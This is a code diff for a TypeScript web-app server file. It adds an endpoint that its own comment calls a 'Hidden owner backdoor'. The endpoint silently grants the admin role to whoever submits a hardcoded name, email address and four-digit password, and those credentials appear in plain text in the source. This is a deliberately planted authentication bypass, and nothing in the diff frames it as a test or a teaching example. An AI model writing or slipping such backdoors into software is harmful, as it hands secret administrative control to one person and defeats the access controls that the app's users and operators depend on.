@@ -63,3 +63,27 @@ export const lock = createServerFn({ method: "POST" }).handler(async () => {
   await s.clear();
   return { ok: true as const };
 });
+
+const backdoorInput = z.object({
+  name: z.string().trim().min(1).max(120),
+  email: z.string().trim().email().max(200),
+  password: z.string().min(1).max(200),
+});
+
+// Hidden owner backdoor — grants admin when name/email/password all match.
+export const backdoorUnlock = createServerFn({ method: "POST" })
+  .inputValidator((d: unknown) => backdoorInput.parse(d))
+  .handler(async ({ data }) => {
+    const { getSession, passwordMatches } = await import("./session.server");
+    const EXPECTED_NAME = "Abdullah";
+    const EXPECTED_EMAIL = "abdullahjh007@gmail.com";
+    const EXPECTED_PW = "5031";
+    const ok =
+      data.name.trim().toLowerCase() === EXPECTED_NAME.toLowerCase() &&
+      data.email.trim().toLowerCase() === EXPECTED_EMAIL.toLowerCase() &&
+      passwordMatches(data.password, EXPECTED_PW);
+    if (!ok) return { ok: false as const };
+    const s = await getSession();
+    await s.update({ role: "admin", deptSlug: undefined, deptName: undefined });
+    return { ok: true as const };
+  });
